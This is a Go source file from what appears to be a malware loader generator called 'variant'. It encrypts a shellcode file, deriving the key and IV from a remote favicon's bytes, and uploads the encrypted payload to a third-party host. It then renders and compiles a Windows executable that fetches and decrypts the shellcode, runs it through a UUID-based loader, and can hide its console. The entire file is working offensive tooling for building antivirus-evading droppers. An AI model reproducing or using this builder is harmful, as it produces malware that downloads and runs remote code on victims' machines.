package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/dynamic"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/remote"
	"variant/render"
)

func main() {
	//local := render.Local{
	//	KeyName:  rand.RStrings(),
	//	KeyValue: rand.LStrings(16),
	//	IvName:   rand.RStrings(),
	//	IvValue:  rand.LStrings(16),
	//}

	dy := render.Dynamic{
		Import:        "variant/dynamic",
		DynamicUrl:    "https://www.baidu.com/favicon.ico",
		DynamicMethod: "dynamic.GetIcoHex",
		DynamicKey:    rand.RStrings(),
		KeyStart:      0,
		KeyEnd:        8,
		DynamicIV:     rand.RStrings(),
		IVStart:       10,
		IVEnd:         18,
	}

	loader := render.Loader{
		Method: "loader.UuidFromString",
		Hide:   "loader.HideConsoleW32",
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
		IV:        dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
	}
	// 加密之后的 shellcode
	payload, _ := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	_ = params.WriteStrings(payload)

	// 上传远程加载的Payload到第三方
	cUrl := remote.Transfer{
		Src:   params.FileName,
		Path:  "D:\\variant\\output\\",
		Proxy: "192.168.31.10:2080",
	}
	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import:  "variant/remote",
		UrlName: rand.RStrings(),
		Url:     cUrl.CurlUpload(),
		Method:  "remote.RestyStrings",
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText:    rand.RStrings(),
		PlainText:     rand.RStrings(),
		DecryptMethod: "crypto.XorSm4HexBase85Decrypt",
		Loader:        loader,
		Dynamic:       dy,
		Remote:        remoteSet,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v3/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err := render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
	}

	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

}
